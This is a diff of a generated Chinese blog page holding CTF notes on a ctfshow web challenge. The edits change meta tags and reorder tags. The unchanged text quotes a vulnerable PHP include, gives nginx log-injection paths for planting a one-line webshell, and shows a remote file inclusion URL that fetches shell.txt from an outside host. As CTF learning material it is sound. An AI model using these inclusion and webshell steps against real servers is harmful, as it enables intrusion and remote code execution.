@@ -8,13 +8,13 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>ctfshow 知识点积累 | Xun9er&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ctf show 知识点积累web4 日志注入\远程文件包含 页面显示： &amp;lt;?php include($_GET[&amp;#39;url&amp;#39;]);?&amp;gt; 不过php data什么的都被pass了。  就没法用伪协议。  日志注入 请求头可以看到是Ubuntu nginx nginx的日志文件在/var/log/nginx/access.log和/var/log/nginx/error.l">
+  <meta name="description" content="ctf show 知识点积累">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow 知识点积累">
 <meta property="og:url" content="http://yoursite.com/2020/04/17/ctf-show-知识点积累/index.html">
 <meta property="og:site_name" content="Xun9er&#39;s blog">
-<meta property="og:description" content="ctf show 知识点积累web4 日志注入\远程文件包含 页面显示： &amp;lt;?php include($_GET[&amp;#39;url&amp;#39;]);?&amp;gt; 不过php data什么的都被pass了。  就没法用伪协议。  日志注入 请求头可以看到是Ubuntu nginx nginx的日志文件在/var/log/nginx/access.log和/var/log/nginx/error.l">
+<meta property="og:description" content="ctf show 知识点积累">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2020/04/16/fAQ7FuLYvU4kDH3.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/16/j9YdAozNBWcnei1.png">
@@ -25,10 +25,10 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/16/ILWYXHbtoV18fNR.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/16/zaKYEpvBQRwS6TG.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/16/COtNvaJyT5rZn41.png">
-<meta property="og:updated_time" content="2020-04-16T16:02:14.066Z">
+<meta property="og:updated_time" content="2020-04-16T16:10:32.677Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ctfshow 知识点积累">
-<meta name="twitter:description" content="ctf show 知识点积累web4 日志注入\远程文件包含 页面显示： &amp;lt;?php include($_GET[&amp;#39;url&amp;#39;]);?&amp;gt; 不过php data什么的都被pass了。  就没法用伪协议。  日志注入 请求头可以看到是Ubuntu nginx nginx的日志文件在/var/log/nginx/access.log和/var/log/nginx/error.l">
+<meta name="twitter:description" content="ctf show 知识点积累">
 <meta name="twitter:image" content="https://i.loli.net/2020/04/16/fAQ7FuLYvU4kDH3.png">
   
     <link rel="alternative" href="/atom.xml" title="Xun9er&#39;s blog" type="application/atom+xml">
@@ -228,7 +228,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="ctf-show-知识点积累"><a href="#ctf-show-知识点积累" class="headerlink" title="ctf show 知识点积累"></a>ctf show 知识点积累</h1><h2 id="web4-日志注入-远程文件包含"><a href="#web4-日志注入-远程文件包含" class="headerlink" title="web4 日志注入\远程文件包含"></a>web4 日志注入\远程文件包含</h2><p> 页面显示：<br> <code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code><br> 不过php data什么的都被pass了。  就没法用伪协议。 </p>
+        <h1 id="ctf-show-知识点积累"><a href="#ctf-show-知识点积累" class="headerlink" title="ctf show 知识点积累"></a>ctf show 知识点积累</h1><a id="more"></a>
+<h2 id="web4-日志注入-远程文件包含"><a href="#web4-日志注入-远程文件包含" class="headerlink" title="web4 日志注入\远程文件包含"></a>web4 日志注入\远程文件包含</h2><p> 页面显示：<br> <code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code><br> 不过php data什么的都被pass了。  就没法用伪协议。 </p>
 <h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><p> 请求头可以看到是Ubuntu nginx<br> nginx的日志文件在/var/log/nginx/access.log和/var/log/nginx/error.log<br> <img src="https://i.loli.net/2020/04/16/fAQ7FuLYvU4kDH3.png" alt="web4.png"><br>默认目录：<code>?url=/var/log/nginx/access.log</code><br><a href="https://blog.csdn.net/weixin_33922670/article/details/93996624" target="_blank" rel="noopener">默认日志和配置文件路径</a><br>access.log 记录了哪些用户，哪些页面以及用户浏览器、ip和其他的访问信息。 </p>
 <p>burp参数然后写入一句话链接。  </p>
 <h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p><code>?url=http://xxx.xxx.xxx.xxx/shell.txt</code>  </p>
@@ -567,10 +568,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">php伪随机数</a>
               </li>
              
@@ -579,15 +576,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">md5</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">序列化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -596,6 +589,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">序列化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -619,19 +620,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">bypass</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">upload-labs</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">bypass</a>
               </li>
             
             <div class="clearfix"></div>
